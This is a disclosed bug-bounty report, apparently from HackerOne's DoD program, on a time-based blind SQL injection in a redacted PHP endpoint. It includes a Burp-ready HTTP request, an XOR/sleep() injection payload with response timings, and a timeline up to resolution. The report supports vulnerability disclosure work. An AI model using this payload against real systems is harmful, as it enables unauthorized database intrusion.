---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - stack/php
  - vuln/sql-injection
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2020-11-23
submitted: 2020-11-03T04:17:44.917Z
bounty_usd: null
votes: 14
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "testfortesttest"
source: "https://hackerone.com/reports/1024984"
title: "[SQLI ]Time Bassed Injection at ██████████ via /██████/library.php?c=G14 parameter"
---
# [SQLI ]Time Bassed Injection at ██████████ via /██████/library.php?c=G14 parameter

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 14 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-11-23

- Report: [https://hackerone.com/reports/1024984](https://hackerone.com/reports/1024984)
- CWE: SQL Injection
- Submitted: 2020-11-03T04:17:44.917Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Step-by-step Reproduction Instructions
 copy the request to your burp suite :
````
GET /█████████/library.php?c=G14'XOR(if(now()=sysdate(),sleep(1*1),0))OR' HTTP/1.1
Host: ██████
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36
Connection: close
````

```
payload > 'XOR(if(now()=sysdate(),sleep(1*1),0))OR'    2,077 millis
```

██████████


```
paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     4,599 millis
```
████████

```
paload > 'XOR(if(now()=sysdate(),sleep(2*2),0))OR'     9,989 millis
```
███


This issue is same to #995122

## Impact

SQL Injection

## Timeline

- **Report Filed**
- **2020-11-03** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **2020-11-05** @testfortesttest: hello @agent-j5 ,
This issue is fixed now i'm checked
██████
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
